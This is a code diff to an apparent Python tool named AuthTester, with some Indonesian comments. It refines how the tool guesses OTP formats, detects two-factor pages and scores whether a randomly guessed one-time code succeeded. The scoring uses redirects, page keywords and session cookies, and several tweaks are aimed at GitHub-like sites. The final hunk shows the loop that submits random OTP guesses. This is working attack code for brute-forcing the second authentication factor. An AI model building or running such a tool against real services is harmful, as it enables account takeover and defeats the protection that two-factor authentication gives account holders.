@@ -119,9 +119,61 @@ class AuthTester:
             print(f"[+] Detected OTP length: {length}, type: {otp_type}")
         else:
             print("[-] OTP details undetected")
-            length = 6
-            otp_type = 'number'
-
+            while True:
+                print("Select OTP preset or manual:")
+                print("00: length=6, type=number")
+                print("01: length=6, type=alphanum")
+                print("10: length=4, type=number")
+                print("11: length=4, type=alphanum")
+                print("2: Manual input")
+                choice = input("Enter choice (00, 01, 10, 11, or 2): ").strip()
+                
+                if choice == '00':
+                    length = 6
+                    otp_type = 'number'
+                    break
+                elif choice == '01':
+                    length = 6
+                    otp_type = 'alphanum'
+                    break
+                elif choice == '10':
+                    length = 4
+                    otp_type = 'number'
+                    break
+                elif choice == '11':
+                    length = 4
+                    otp_type = 'alphanum'
+                    break
+                elif choice == '2':
+                    # Manual input for length
+                    while True:
+                        try:
+                            length_input = input("What is the expected length of the OTP code? (e.g., 6 for standard TOTP): ").strip()
+                            length = int(length_input)
+                            if length > 0:
+                                break
+                            else:
+                                print("[-] Invalid length: Must be a positive integer.")
+                        except ValueError:
+                            print("[-] Invalid input: Please enter a number.")
+                    
+                    # Manual input for otp_type
+                    while True:
+                        print("What is the type of the OTP code?")
+                        print("1. number (digits only)")
+                        print("2. alphanum (letters and numbers)")
+                        otp_type_input = input("Enter 1 or 2: ").strip()
+                        if otp_type_input == '1':
+                            otp_type = 'number'
+                            break
+                        elif otp_type_input == '2':
+                            otp_type = 'alphanum'
+                            break
+                        else:
+                            print("[-] Invalid choice: Enter 1 or 2.")
+                    break
+                else:
+                    print("[-] Invalid choice: Enter 00, 01, 10, 11, or 2.")
         # Ask mode if not provided (sekali saja)
         otp_auto = auto_mode
         if otp_auto is None:
@@ -343,8 +395,11 @@ class AuthTester:
                
                 # Baseline OTP detected (narrowed)
                 otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
+
+                # Deteksi OTP yang lebih komprehensif
                 baseline_otp_detected = any(keyword in response.text.lower() for keyword in otp_keywords) and (
-                    '/sessions/two-factor' in action.lower() or 'two-factor' in self.login_page_url.lower() or 'otp' in self.login_page_url.lower()
+                    any(keyword in action.lower() for keyword in otp_keywords) or 
+                    any(keyword in self.login_page_url.lower() for keyword in otp_keywords)
                 )
                 self.baseline_otp_detected = baseline_otp_detected
                
@@ -692,36 +747,48 @@ class AuthTester:
         # PERBAIKAN: Check status code for failure (e.g., 401 Unauthorized)
         if response.status_code in [401, 403]:
             score -= 3
-            print("[DEBUG] [-] Failure: Unauthorized status code detected | Score now: {score}")
+            print(f"[DEBUG] [-] Failure: Unauthorized status code detected | Score now: {score}")
         
-        # 1. Detect response redirect
+        # 1. Detect response redirect - Prioritaskan sukses jika ada redirect dan tidak kembali ke failure page
+        failure_urls = ['login', 'otp', 'verify', 'two-factor', '2fa']  # Daftar URL indikasi failure/OTP
         if response.history:
             print("[DEBUG] [+] Redirect detected")
             score += 2
             print(f"[DEBUG] Score now: {score}")
-            # PERBAIKAN: Check if redirected back to OTP or login page (failure)
-            if any('login' in r.url.lower() or 'otp' in r.url.lower() or 'verify' in r.url.lower() for r in response.history) or \
-            'login' in final_url or 'otp' in final_url or 'verify' in final_url:
+            # Check if redirected back to OTP or login page (failure)
+            if any(any(fail in r.url.lower() for fail in failure_urls) for r in response.history) or \
+            any(fail in final_url for fail in failure_urls):
                 score -= 4
-                print("[DEBUG] [-] Failure: Redirected back to login/OTP page | Score now: {score}")
-            # Check if redirected to a success-like page (hanya jika bukan failure URL)
-            success_redirect_keywords = ['dashboard', 'home', 'profile', 'user', 'account', '/', 'settings']  # Added 'settings' for GitHub-like cases
-            if any(keyword in final_url for keyword in success_redirect_keywords) and \
-            not any(keyword in final_url for keyword in ['login', 'otp', 'verify']):
+                print(f"[DEBUG] [-] Failure: Redirected back to login/OTP page | Score now: {score}")
+            else:
+                # Prioritas tinggi: Jika redirect dan bukan ke failure, tambah score tinggi karena ini strong indicator sukses
+                print("[DEBUG] [+] Redirect to non-failure URL - high success priority")
+                score += 6  # Bonus lebih tinggi untuk prioritaskan kasus ini
+                print(f"[DEBUG] Score now: {score}")
+            
+            # Tambahan check if redirected to a success-like page (bonus ekstra)
+            success_redirect_keywords = ['dashboard', 'home', 'profile', 'user', 'account', '/', 'settings']
+            if any(keyword in final_url for keyword in success_redirect_keywords):
                 print("[DEBUG] [+] Redirected to a likely success page")
                 score += 3
                 print(f"[DEBUG] Score now: {score}")
+            
             if final_url == original_otp_url.lower():
                 print("[DEBUG] [-] Redirected back to original OTP URL - likely failure")
                 score -= 4
                 print(f"[DEBUG] Score now: {score}")
         else:
             print("[DEBUG] [-] No redirect detected")
-            if final_url == original_otp_url.lower():
-                score -= 2  # Still on OTP page without redirect - possible failure
+            if final_url == original_otp_url.lower() or any(fail in final_url for fail in failure_urls):
+                score -= 4  # Penalty lebih tinggi jika stuck di OTP tanpa redirect
+                print(f"[DEBUG] [-] Stuck on OTP/failure URL without redirect | Score now: {score}")
+            else:
+                # Jika no redirect tapi URL berubah ke non-failure (e.g., AJAX success), bonus
+                print("[DEBUG] [+] No redirect but changed to non-OTP URL - assume success")
+                score += 4
                 print(f"[DEBUG] Score now: {score}")
         
-        # 2. Success indicators (+1 each)
+        # 2. Success indicators (+1 each): Look for links or buttons with these texts
         success_indicators = ['youraccount','logout', 'dashboard', 'welcome', 'my account','my-account', 'sign out', 'profile', 'logged in', 'user info', 'account', 'settings', 'balance', 'credit card', 'your information', 'session started','subscription','personal']
         for indicator in success_indicators:
             # Expanded tag search: Added <li>, <ul> for navbars
@@ -735,7 +802,8 @@ class AuthTester:
                     break  # Avoid multiple +1 for same indicator
             if not found and any(cls in ['success', 'info', 'welcome'] for cls in soup.find_all(attrs={'class': lambda c: c})):
                 score += 1
-                print(f"[DEBUG] [+] Found success class for '{indicator}' | Score now: {score}")        
+                print(f"[DEBUG] [+] Found success class for '{indicator}' | Score now: {score}")
+        
         # 3. Strict failure detection: Require at least two specific keywords in context (e.g., 'two-factor' and 'failed')
         failure_keywords_sets = [
             ['two-factor', 'failed'],
@@ -755,13 +823,16 @@ class AuthTester:
         ]
         failure_detected = False
         error_elements = soup.find_all(lambda tag: tag.name in ['div', 'p', 'span'] and any(cls in tag.get('class', []) for cls in ['error', 'alert', 'flash-error', 'danger']))
+        ignore_phrases = ['failed deliveries', 'verification status', 'failed attempts log']  # GitHub-specific false positives
         for elem in error_elements:
             elem_text_lower = elem.text.lower()
+            if any(ignore in elem_text_lower for ignore in ignore_phrases):
+                continue  # Skip false positives
             for keyword_set in failure_keywords_sets:
                 if all(kw in elem_text_lower for kw in keyword_set):
                     failure_detected = True
                     score -= 4  # Heavier penalty for strict match
-                    print(f"[-] Found strict failure indicator with keywords: {', '.join(keyword_set)} in {elem.name} tag")
+                    print(f"[DEBUG] [-] Strict failure with keywords: {', '.join(keyword_set)} in {elem.name} tag (text: {elem.text[:50]}...) | Score now: {score}")
                     break  # Stop after finding one strict match per element
             if failure_detected:
                 break  # Optional: Stop after any strict failure to avoid over-penalizing
@@ -778,7 +849,7 @@ class AuthTester:
                     text_lower = p.text.lower()
                     if indicator in text_lower and any(kw in text_lower for kw in otp_context_keywords):
                         score -= 2
-                        print(f"[-] Found general failure indicator: '{indicator}' in <p> tag with OTP context")
+                        print(f"[DEBUG] [-] General failure: '{indicator}' in <p> tag with OTP context (text: {text_lower[:50]}...) | Score now: {score}")
                         found = True
                 # Or in error div with context in same element
                 if not found:
@@ -786,20 +857,20 @@ class AuthTester:
                         text_lower = div.text.lower()
                         if indicator in text_lower and any(kw in text_lower for kw in otp_context_keywords) and 'hidden' not in div.attrs:
                             score -= 2
-                            print(f"[-] Found general failure indicator: '{indicator}' in visible error div with OTP context")
+                            print(f"[DEBUG] [-] General failure: '{indicator}' in visible error div with OTP context (text: {text_lower[:50]}...) | Score now: {score}")
                             found = True
                 # Add check in <span> or <h2> etc. with context in same element
                 if not found:
                     found_tag = soup.find(lambda tag: tag.name in ['span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'] and indicator in tag.text.lower() and any(kw in tag.text.lower() for kw in otp_context_keywords))
                     if found_tag:
                         score -= 2
-                        print(f"[-] Found general failure indicator: '{indicator}' in {found_tag.name} tag with OTP context")
+                        print(f"[DEBUG] [-] General failure: '{indicator}' in {found_tag.name} tag with OTP context (text: {found_tag.text[:50]}...) | Score now: {score}")
         
         # Special handling for 'login': Check in <button> or <h1>-<h6>
         if soup.find('button', string=lambda text: text and 'login' in text.lower()) or \
         any(soup.find(f'h{i}', string=lambda text: text and 'login' in text.lower()) for i in range(1,7)):
             score -= 2
-            print(f"[-] Found failure indicator: 'login' in <button> or <h#> tag")
+            print(f"[DEBUG] [-] Failure indicator: 'login' in <button> or <h#> tag | Score now: {score}")
         
         # OTP keywords (present -1, absent +1): Check if in form labels or inputs
         otp_keywords = ['otp', 'verification', 'two-factor', '2fa', 'twofactor', 'authenticator', 'verification code', 'mfa', 'one-time', 'security code', 'pin']
@@ -812,12 +883,22 @@ class AuthTester:
                 break
         if otp_detected:
             score -= 1
+            print(f"[DEBUG] [-] OTP keywords present | Score now: {score}")
         else:
             score += 1
+            print(f"[DEBUG] [+] No OTP keywords | Score now: {score}")
         
-        print(f"[*] OTP evaluation score: {score} (threshold >=4)")
+        # Bonus jika cookie baru dan menandakan session sukses
+        if len(response.cookies) > 0 and any('sess' in key.name.lower() or 'auth' in key.name.lower() for key in response.cookies):
+            score += 2
+            print(f"[DEBUG] [+] New session/auth cookie detected | Score now: {score}")
         
-        return score >= 4, score        
+        # Dynamic threshold: Lower jika redirect sukses
+        threshold = 3 if any(keyword in final_url for keyword in success_redirect_keywords) else 4
+        print(f"[*] OTP evaluation score: {score} (threshold >= {threshold})")
+        
+        return score >= threshold, score
+
     def is_still_login_page(self, response):
         """Check if the response still contains a login form or failure indicators"""
         content_type = response.headers.get('Content-Type', '').lower()
@@ -1119,7 +1200,7 @@ class AuthTester:
             del headers['Content-Type']
 
         enctype = otp_form.get('enctype', 'application/x-www-form-urlencoded').lower()
-
+        # otp=input("Enter OTP code: ").strip()
         for attempt in range(max_attempts):
             otp = ''.join(random.choices(chars, k=length))
             temp_data = data.copy()
